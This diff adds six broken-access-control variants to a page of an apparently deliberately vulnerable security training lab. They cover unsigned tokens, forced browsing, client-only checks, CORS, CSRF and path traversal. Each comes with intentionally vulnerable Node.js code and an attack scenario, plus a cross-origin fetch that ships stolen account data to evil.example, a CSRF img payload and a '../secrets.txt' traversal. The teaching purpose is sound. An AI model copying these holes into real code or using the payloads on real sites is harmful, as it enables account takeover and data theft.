@@ -310,8 +310,105 @@ SELECT * FROM invoices WHERE invoice_number = 'INV-2026-001';</pre></div>
         </details>
 
         <details class="variant-detail">
-          <summary>Variants 6–11 implemented in this lab (screen above)</summary>
-          <p>Not from the original five, but standard extensions of A01 covered by the panels above: <strong>JWT/Token Tampering</strong> (CWE-347, unsigned tokens with editable claims), <strong>Forced Browsing</strong> (CWE-425, unlinked-but-unprotected admin pages), <strong>Client-Side-Only Access Control</strong> (CWE-602, UI hides the button but the API doesn't check), <strong>CORS Misconfiguration</strong> (CWE-942, reflect-any-origin + credentials), <strong>CSRF</strong> (CWE-352, state changes triggered by a third-party page via the victim's cookie), and <strong>Path Traversal bypassing access restriction on files</strong> (CWE-22/23, officially mapped under A01:2021). Scroll up to try each one live.</p>
+          <summary>Variant 6 — JWT / Token Tampering (Trusting an Unsigned Client-Supplied Claim) <span class="cwe-tag">CWE-347</span></summary>
+          <p><strong>Mechanism:</strong> the "auth token" issued at login is just <code>base64(JSON.stringify(payload))</code> — there is no HMAC/RSA signature, no <code>alg</code> verification, nothing. The server decodes it and trusts every field (<code>id</code>, <code>role</code>, <code>tenantId</code>) exactly as given.</p>
+          <p><strong>Impact:</strong> anyone holding a token — even a normal user's — can forge a different identity, role, or tenant entirely offline, with no cryptographic secret required.</p>
+          <div class="code-block"><div class="lang">Node.js — utils/auth.js (vulnerable, this app)</div><pre>function issueToken(payload) {
+  return Buffer.from(JSON.stringify(payload)).toString('base64');
+}
+function decodeToken(token) {
+  return JSON.parse(Buffer.from(token, 'base64').toString('utf8'));
+}
+// No signature is ever generated or verified — decodeToken() just
+// trusts whatever JSON comes back out of the base64 string.
+function fakeAuth(req, res, next) {
+  const header = req.headers.authorization || '';
+  const token = header.startsWith('Bearer ') ? header.slice(7) : null;
+  req.user = token ? decodeToken(token) : null; // fully attacker-controlled
+  next();
+}</pre></div>
+          <p><strong>Attack scenario:</strong> alice logs in and gets a token. She runs <code>atob(token)</code> in the browser console, sees <code>{"id":1,"username":"alice","role":"user","tenantId":1}</code>, changes <code>"role"</code> to <code>"admin"</code>, runs <code>btoa(JSON.stringify(edited))</code>, and sends that as her new Bearer token. Every admin-gated route now treats her as an administrator.</p>
+        </details>
+
+        <details class="variant-detail">
+          <summary>Variant 7 — Forced Browsing to an Unprotected Admin Resource <span class="cwe-tag">CWE-425</span></summary>
+          <p><strong>Mechanism:</strong> a fully functional admin page (and the API it calls) exists at a predictable/guessable URL. It is never linked from the app's navigation, so the developer assumed nobody would find it — but neither the page nor its API perform any session or role check.</p>
+          <p><strong>Impact:</strong> anyone who guesses, brute-forces, or stumbles on the URL (e.g. via a leaked link, sitemap, JS bundle reference, or wordlist scan) gets full admin functionality with zero authentication.</p>
+          <div class="code-block"><div class="lang">Node.js — routes/a01.js (vulnerable, this app)</div><pre>// Reachable at GET /a01/admin-panel.html via express.static() —
+// no auth middleware in front of the static file at all.
+
+router.get('/admin/stats', (req, res) => {
+  // Vulnerable: no fakeAuth, no requireAdmin — completely unauthenticated.
+  res.json({
+    totalUsers: store.users.length,
+    totalOrders: store.orders.length,
+    totalRevenue: store.orders.reduce((sum, o) => sum + o.amount, 0),
+    allUsernamesAndRoles: store.users.map((u) => ({ username: u.username, role: u.role })),
+  });
+});</pre></div>
+          <p><strong>Attack scenario:</strong> an attacker runs a wordlist scan (<code>ffuf</code>/<code>gobuster</code>) against the app, or simply reads the shipped JS bundle and notices a reference to <code>/admin-panel.html</code>. They open it directly, logged out, and see live revenue and user data — "security through obscurity" was the only thing protecting it.</p>
+        </details>
+
+        <details class="variant-detail">
+          <summary>Variant 8 — Client-Side-Only Access Control <span class="cwe-tag">CWE-602</span></summary>
+          <p><strong>Mechanism:</strong> the frontend decodes the user's own token and hides a sensitive "admin" button/action if the role isn't <code>admin</code> — but the backend endpoint behind that button performs no authorization check (often none at all) of its own.</p>
+          <p><strong>Impact:</strong> the restriction is purely cosmetic. Anyone who bypasses the UI — curl, Postman, a browser devtools fetch — can call the action regardless of role, or even without logging in.</p>
+          <div class="code-block"><div class="lang">JS (frontend) + Node.js (backend) — vulnerable, this app</div><pre>// Frontend (public/a01/a01.js) — enforcement lives ONLY here:
+forceBtn.style.display = decoded.role === 'admin' ? 'inline-block' : 'none';
+
+// Backend (routes/a01.js) — no matching check exists server-side:
+router.delete('/orders/:id/force', (req, res) => {
+  // Vulnerable: no fakeAuth, no requireAdmin, no check of any kind.
+  const deleted = store.deleteOrder(req.params.id);
+  res.json({ deleted });
+});</pre></div>
+          <p><strong>Attack scenario:</strong> logged in as alice (a plain user), the "Force delete" button never renders. The attacker opens devtools, finds <code>DELETE /api/a01/orders/3/force</code> referenced in the JS, and calls it directly with <code>fetch()</code> or curl — the order is deleted with no role check ever executed.</p>
+        </details>
+
+        <details class="variant-detail">
+          <summary>Variant 9 — CORS Misconfiguration (Overly Permissive Cross-Origin Access) <span class="cwe-tag">CWE-942</span></summary>
+          <p><strong>Mechanism:</strong> the server enables CORS with <code>origin: true</code> (reflects back whatever <code>Origin</code> header the caller sends as if it were allow-listed) combined with <code>credentials: true</code> — the one combination CORS specifically warns against, because it lets any website read authenticated responses using the victim's cookies.</p>
+          <p><strong>Impact:</strong> a completely unrelated, attacker-controlled website can silently query the app's API on behalf of a logged-in visitor and read the response, without the victim ever knowing.</p>
+          <div class="code-block"><div class="lang">Node.js — server.js (vulnerable, this app)</div><pre>// VULN: CWE-942 — reflects any Origin AND allows credentials.
+app.use(cors({ origin: true, credentials: true }));</pre></div>
+          <div class="code-block"><div class="lang">Attacker's page — exploit</div><pre>// Hosted on evil.example, loaded while the victim is logged into the lab
+fetch('http://localhost:3000/api/a01/account', { credentials: 'include' })
+  .then(r => r.json())
+  .then(data => sendToAttackerServer(data)); // steals email, credits, tenant, etc.</pre></div>
+          <p><strong>Attack scenario:</strong> alice is logged into the lab in one tab. She visits <code>evil.example</code> in another. Its script fetches <code>/api/a01/account</code> with <code>credentials:'include'</code> — the browser attaches alice's cookie, the server reflects <code>evil.example</code> back as an allowed origin, and the attacker's page reads alice's account data directly.</p>
+        </details>
+
+        <details class="variant-detail">
+          <summary>Variant 10 — Cross-Site Request Forgery (CSRF) <span class="cwe-tag">CWE-352</span></summary>
+          <p><strong>Mechanism:</strong> a state-changing action (transferring "credits") is wired up on <code>GET</code> instead of <code>POST</code>, relies solely on a session cookie with no <code>SameSite</code> restriction, and requires no anti-CSRF token or Origin/Referer check.</p>
+          <p><strong>Impact:</strong> any third-party page can trigger the action on a logged-in victim's behalf just by getting their browser to load a URL — an <code>&lt;img&gt;</code> tag is enough, no JavaScript or click required.</p>
+          <div class="code-block"><div class="lang">Node.js — routes/a01.js (vulnerable, this app)</div><pre>// No CSRF token check, no re-authentication, and it's a GET:
+router.get('/transfer', fakeAuth, (req, res) => {
+  const { to, amount } = req.query;
+  sender.credits -= amt;
+  recipient.credits += amt;
+  res.json({ transferred: amt, from: sender.username, to: recipient.username });
+});</pre></div>
+          <div class="code-block"><div class="lang">Malicious page — exploit (public/a01/csrf-poc.html)</div><pre>&lt;img src="http://localhost:3000/api/a01/transfer?to=mallory&amp;amount=50"&gt;
+&lt;!-- Browser auto-attaches the victim's a01_session cookie to this GET --&gt;</pre></div>
+          <p><strong>Attack scenario:</strong> alice logs into the lab (cookie is set). She opens an unrelated-looking page in another tab; its hidden <code>&lt;img&gt;</code> tag fires a GET to the transfer endpoint. Her browser automatically attaches her session cookie, and 50 of her credits move to "mallory" with no prompt, click, or confirmation.</p>
+        </details>
+
+        <details class="variant-detail">
+          <summary>Variant 11 — Path Traversal Bypassing Access Restriction on Files <span class="cwe-tag">CWE-22 / CWE-23</span></summary>
+          <p><strong>Mechanism:</strong> a file-serving endpoint joins user-supplied <code>tenant</code>/<code>name</code> parameters directly onto a base directory with no normalization or allow-list check, and separately never verifies the requested tenant matches the caller's own tenant.</p>
+          <p><strong>Impact:</strong> an attacker can read another tenant's private files (broken tenant isolation) or use <code>../</code> sequences to escape the intended directory and read arbitrary files elsewhere on disk (e.g. application source, secrets).</p>
+          <div class="code-block"><div class="lang">Node.js — routes/a01.js (vulnerable, this app)</div><pre>router.get('/files', fakeAuth, (req, res) => {
+  const { tenant, name } = req.query;
+  // Vulnerable: no allow-list on tenant/name, and no check that
+  // tenant === req.user.tenantId.
+  const filePath = path.join(__dirname, '..', 'private', tenant || '', name || 'invoice.txt');
+  fs.readFile(filePath, 'utf8', (err, data) => {
+    if (err) return res.status(404).json({ error: err.message, filePath });
+    res.type('text/plain').send(data);
+  });
+});</pre></div>
+          <p><strong>Attack scenario:</strong> logged in as bob (Globex Inc), requesting <code>?tenant=tenant-1&amp;name=invoice.txt</code> returns Acme Corp's invoice directly (tenant bypass, no traversal needed). Requesting <code>?tenant=tenant-1&amp;name=../secrets.txt</code> escapes the tenant folder entirely and reads an app-wide secrets file that isn't scoped to any tenant.</p>
         </details>
 
         <h3>3. How Attackers Exploit Broken Access Control</h3>
